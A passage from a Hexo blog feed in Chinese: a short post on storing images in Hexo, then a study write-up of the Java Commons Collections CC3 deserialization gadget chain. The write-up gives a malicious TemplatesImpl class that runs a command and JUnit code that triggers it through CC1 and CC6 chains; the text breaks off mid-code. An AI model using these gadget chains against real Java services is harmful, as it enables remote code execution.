        <content type="html"><![CDATA[<p>hexo博客中图片有几种方式存储，网络链接，本地图片</p><h3 id="网络链接"><a href="#网络链接" class="headerlink" title="网络链接"></a>网络链接</h3><p>网络链接说实话其实是最好的，但是需要一个图床储存。</p><p>使用格式如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">!<span class="hljs-selector-attr">[]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//.../*.png)</span><br></code></pre></td></tr></table></figure><p>就是不知道图片那天死了（无法访问）都不知道。加载也是问题，吃网络，不是很需要担心，没那么可怕。</p><h3 id="本地文件"><a href="#本地文件" class="headerlink" title="本地文件"></a>本地文件</h3><h4 id="全局资源文件夹"><a href="#全局资源文件夹" class="headerlink" title="全局资源文件夹"></a>全局资源文件夹</h4><p>在source目录下创建一个目录存储图片。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span>/image<br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">!<span class="hljs-selector-attr">[]</span>(<span class="hljs-selector-tag">image</span><span class="hljs-comment">/*.png)</span><br></code></pre></td></tr></table></figure><p>但是放在_post目录的文件看不到图片，只有上传后在网站上才可以看到。</p><h4 id="文章资源文件夹"><a href="#文章资源文件夹" class="headerlink" title="文章资源文件夹"></a>文章资源文件夹</h4><p>修改<code>_config.yml</code>的配置项目</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">marked:</span><br>  <span class="hljs-attr">prependRoot:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>则会在 <code>hexo new name</code>同时创建</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">name</span>.md<br><span class="hljs-keyword">name</span> <span class="hljs-comment">//目录</span><br><br>使用<br>![](<span class="hljs-keyword">name</span><span class="hljs-comment">/*.png)</span><br></code></pre></td></tr></table></figure><p>使用typora联动</p><p><img src="/2025/03/29/hexo_img/image-20250329220250324.png" alt="image-20250329220250324"></p><p>安装下面的插件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm install hexo-asset-<span class="hljs-selector-tag">img</span> <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CC3</title>
      <link href="/2025/03/29/CC3/"/>
      <url>/2025/03/29/CC3/</url>
      
        <content type="html"><![CDATA[<p>刚开始学习JAVA还是有点蒙的，但好在坚持下来了。</p><p>CC3链与CC1和CC6区别很大，CC3是通过动态加载类机制实现自动执行恶意代码。</p><p>恶意类Calc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java.lang.ClassLoader</code>，此时的 <code>defineClass()</code> 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 <code>newInstance()</code> 的实例化。</p><h2 id="TemplatesImpl-解析"><a href="#TemplatesImpl-解析" class="headerlink" title="TemplatesImpl 解析"></a>TemplatesImpl 解析</h2><p><code>java.lang.ClassLoader</code></p><p>中有很多个<code>defineClass()</code>的重载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Deprecated</span> <span class="hljs-comment">//已弃用</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)<br>实际调用的是defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len, <span class="hljs-literal">null</span>)<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len,ProtectionDomain protectionDomain)<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name,java.nio.ByteBuffer b,ProtectionDomain protectionDomain)<br><span class="hljs-comment">//支持ByteBuffer输入，适用于直接内存加载（减少内存复制）</span><br><br>defineClass <span class="hljs-number">0</span>-<span class="hljs-number">2</span> 是<span class="hljs-keyword">native</span>，`<span class="hljs-keyword">native</span>` 关键字用于声明本地方法（Native Method）,使用其他语言实现<br></code></pre></td></tr></table></figure><p>这里选择如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)<br>    <span class="hljs-keyword">throws</span> ClassFormatError<br>&#123;<br>    <span class="hljs-keyword">return</span> defineClass(name, b, off, len, <span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>find usage寻找调用</p><h3 id="TransletClassLoader-defineClass"><a href="#TransletClassLoader-defineClass" class="headerlink" title="TransletClassLoader.defineClass()"></a>TransletClassLoader.defineClass()</h3><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader</code>是一个内部类，defineClass就是此类中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>    <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h3><p><code>defineTransletClasses()</code>,_bytecodes不能为null，否则会抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>                <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br><span class="hljs-comment">//...</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>_bytecodes</code>是在构造时传入的，但是不是public，无法直接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TemplatesImpl</span><span class="hljs-params">(<span class="hljs-type">byte</span>[][] bytecodes, String transletName,</span><br><span class="hljs-params">    Properties outputProperties, <span class="hljs-type">int</span> indentNumber,</span><br><span class="hljs-params">    TransformerFactoryImpl tfactory)</span><br>&#123;<br>    _bytecodes = bytecodes;<br>    init(transletName, outputProperties, indentNumber, tfactory);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance()"></a>TemplatesImpl.getTransletInstance()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>        <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>        <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>        <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>        translet.postInitialization();<br>        translet.setTemplates(<span class="hljs-built_in">this</span>);<br>        translet.setServicesMechnism(_useServicesMechanism);<br>        translet.setAllowedProtocols(_accessExternalStylesheet);<br>        <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>            translet.setAuxiliaryClasses(_auxClasses);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> translet;<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>getTransletInstance()</code>中有一个 <code>newInstance()</code>实例化的过程。实例化的 <code>_class</code>是<code>defineclass()</code>加载的类。但是需要注意两个if</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">_name != <span class="hljs-keyword">null</span><br>_<span class="hljs-keyword">class</span> == <span class="hljs-keyword">null</span><br>此时函数触发<br></code></pre></td></tr></table></figure><p><img src="/2025/03/29/CC3/image-20250328222825730.png" alt="image-20250328222825730"></p><h3 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h3><p><code>newTransformer()</code>很熟悉啊，而且是public</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>&#123;<br>    TransformerImpl transformer;<br><br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>        _indentNumber, _tfactory);<br><br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;<br>        transformer.setURIResolver(_uriResolver);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>        transformer.setSecureProcessing(<span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> transformer;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="梳理-测试"><a href="#梳理-测试" class="headerlink" title="梳理+测试"></a>梳理+测试</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">TemplatesImpl.newTransformer()</span><br><br><span class="hljs-string">_name</span> <span class="hljs-type">!=</span> <span class="hljs-literal">null</span><br><span class="hljs-string">_class</span> <span class="hljs-string">==</span> <span class="hljs-literal">null</span><br><span class="hljs-string">TemplatesImpl.getTransletInstance()</span><br><br><span class="hljs-string">_bytecodes</span> <span class="hljs-type">!=</span> <span class="hljs-literal">null</span><br><span class="hljs-string">TemplatesImpl.defineTransletClasses()</span><br><span class="hljs-string">TransletClassLoader.defineClass()</span><br></code></pre></td></tr></table></figure><p>此外，还需要注意属性 <code>_tfactory == null</code>，会空指针错误。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>ctrl+左键，寻找相关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">_tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br></code></pre></td></tr></table></figure><p>又报错了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>    _transletIndex = i;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    _auxClasses.put(_class[i].getName(), _class[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>调试查看</p><p><img src="/2025/03/29/CC3/image-20250328232418571.png" alt="image-20250328232418571"></p><p><code>_auxClasses</code>为null，初始化为一个HashMap，但是加载的类起码要两个，所以反射搞搞。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">if (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>_auxClasses <span class="hljs-operator">=</span> new HashMap&lt;&gt;()<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>defind的类没有继承<code>ABSTRACT_TRANSLET</code>，则会是初始值-1。直接反射，绕过if试试，试试就逝世，总有点小问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>    ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>&#125;<br></code></pre></td></tr></table></figure><p>其实没必要反射，可以直接继承一下的</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>     <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CC1-链的-TemplatesImpl-的实现方式"><a href="#CC1-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC1 链的 TemplatesImpl 的实现方式"></a>CC1 链的 TemplatesImpl 的实现方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;?&gt; clazz = templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-literal">true</span>);<br>        _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        _bytecodes.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_auxClasses</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_auxClasses&quot;</span>);<br>        _auxClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        _auxClasses.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());<br><br>        <span class="hljs-comment">// 实现</span><br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>                <span class="hljs-comment">// CC1 实现</span><br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>1是作为 <code>ConstantTransformer.transform()</code>的参数。</p><h3 id="CC6-链的-TemplatesImpl-的实现方式"><a href="#CC6-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC6 链的 TemplatesImpl 的实现方式"></a>CC6 链的 TemplatesImpl 的实现方式</h3><p>CC6这里出了点问题</p><p><img src="/2025/03/29/CC3/image-20250329135705613.png" alt="image-20250329135705613"></p><p>丢掉_auxClasses的初始化试一试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;?&gt; clazz = templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-literal">true</span>);<br>        _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        _bytecodes.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        ConstantTransformer  constantTransformer= <span class="hljs-keyword">new</span> <span 